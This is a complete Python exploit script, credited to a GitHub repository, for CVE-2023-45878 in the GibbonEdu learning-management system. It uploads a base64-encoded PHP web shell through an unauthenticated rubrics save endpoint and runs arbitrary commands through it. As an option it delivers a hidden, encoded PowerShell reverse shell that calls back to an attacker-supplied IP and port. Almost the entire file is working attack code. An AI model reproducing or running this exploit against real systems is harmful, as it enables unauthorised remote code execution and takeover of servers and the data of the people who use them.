#!/usr/bin/env python3
# Source: https://github.com/davidzzo23/CVE-2023-45878/blob/main/CVE-2023-45878.py

import argparse
import requests
import random
import string
import base64
import sys
import time
import subprocess

def generate_random_filename(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length)) + '.php'

def generate_php_web_shell():
    php_payload = "<?php system($_REQUEST['cmd']); ?>"
    return base64.b64encode(php_payload.encode()).decode()

def upload_web_shell(target, filename, b64_payload):
    url = f"http://{target}/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php"
    data = {
        "img": f"image/png;asdf,{b64_payload}",
        "path": filename,
        "gibbonPersonID": "0000000001"
    }
    print(f"[+] Uploading web shell as {filename}...")
    response = requests.post(url, data=data, headers={"Host": target})
    if response.status_code == 200:
        print("[+] Upload successful.")
    else:
        print(f"[!] Upload failed (HTTP {response.status_code})")
        sys.exit(1)

def execute_remote_command(target, filename, command):
    shell_url = f"http://{target}/Gibbon-LMS/{filename}"
    print(f"[+] Executing command on: {shell_url}?cmd={command}")
    try:
        response = requests.get(shell_url, params={"cmd": command}, timeout=5)
        print("[+] Command output:\n" + response.text.strip())
    except Exception as e:
        print(f"[!] Error connecting to web shell: {e}")

def powershell_reverse_shell(ip, port):
    ps_script = f"""
    $client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{{0}};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }}
    $client.Close()
    """

    b64_payload = base64.b64encode(ps_script.encode('utf-16le')).decode()
    return f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_payload}"

def main():
    parser = argparse.ArgumentParser(description="GibbonEdu Web Shell Exploit (CVE-2023-45878)")
    parser.add_argument("-t", "--target", required=True, help="Target domain (e.g., frizzdc.frizz.htb)")
    parser.add_argument("-c", "--command", help="Command to execute remotely")
    parser.add_argument("-s", "--shell", action="store_true", help="Trigger PowerShell reverse shell")
    parser.add_argument("-i", "--ip", help="Attacker IP for reverse shell (required with -s)")
    parser.add_argument("-p", "--port", type=int, help="Attacker port for reverse shell (required with -s)")

    args = parser.parse_args()

    if args.shell and (not args.ip or not args.port):
        print("[!] -i and -p are required when using -s / --shell")
        sys.exit(1)

    filename = generate_random_filename()
    b64_payload = generate_php_web_shell()

    upload_web_shell(args.target, filename, b64_payload)
    time.sleep(1)

    if args.shell:
        ps_command = powershell_reverse_shell(args.ip, args.port)
        print(f"[+] Sending PowerShell reverse shell payload to http://{args.target}/Gibbon-LMS/{filename}")
        print("[*] Make sure your listener is running: nc -lvnp", args.port)
        execute_remote_command(args.target, filename, ps_command)
    elif args.command:
        execute_remote_command(args.target, filename, args.command)
    else:
        print("[!] Specify either --command or --shell")
        sys.exit(1)

if __name__ == "__main__":
    main()
